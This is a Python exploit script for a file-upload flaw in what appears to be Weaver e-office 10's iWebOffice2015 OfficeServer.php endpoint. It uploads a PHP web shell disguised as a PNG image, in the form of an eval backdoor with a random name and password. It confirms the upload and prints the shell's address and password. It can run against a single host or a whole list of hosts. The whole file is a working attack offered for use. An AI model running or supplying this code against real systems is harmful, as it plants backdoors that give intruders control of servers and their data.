import requests
import click
from urllib.parse import urlparse
import random
import string

def exploit(host):
    pwd = ''.join(random.choice(string.ascii_letters) for x in range(8))
    name = ''.join(random.choice(string.ascii_letters) for x in range(8))
    url = 'http://'+host[1]+'/eoffice10/server/public/iWebOffice2015/OfficeServer.php'
    checkurl = 'http://'+host[1]+'/eoffice10/server/public/iWebOffice2015/Document/'+name+'.php'
    proxies = {
    "http":"http://127.0.0.1:8080",
    "https":"https://127.0.0.1:8080"
    }
    header = {
        'Host': host[1],
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryVUdoVZj5DTBCwV9P',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari537.36',
        'Content-Length': '379'
    }
    data = '''
------WebKitFormBoundaryVUdoVZj5DTBCwV9P
Content-Disposition: form-data; name="FileData"; filename="1.png"
Content-Type: image/png

<?php echo 'ooook';@eval($_POST['%s'])?>
------WebKitFormBoundaryVUdoVZj5DTBCwV9P
Content-Disposition: form-data; name="FormData"

{'USERNAME':'','RECORDID':'undefined','OPTION':'SAVEFILE','FILENAME':'%s.php'}
------WebKitFormBoundaryVUdoVZj5DTBCwV9P--
    '''%(pwd,name)
    requests.post(url=url,headers=header,data=data)
    check = requests.get(url=checkurl)
    if 'ooook' in check.text:
        print('利用成功！\n连接地址为：',checkurl,'\n密码为%s'%(pwd))
    else:
        print('上传失败，目标漏洞可能不存在')


def hostModify(host):
    res = urlparse(host)
    return res

@click.command()
@click.option('-h', default='noset', help="the target's host")
@click.option('-hlist', default='noset', help="the host list")
def main(h,hlist):
    if(h!='noset'):
        url = hostModify(h)
        exploit(url)
    if(hlist!='noset'):
        with open(hlist,'r') as hl:
            for h in hl.readlines():
                url = hostModify(h)
                exploit(url)


if __name__ == '__main__':
    main()
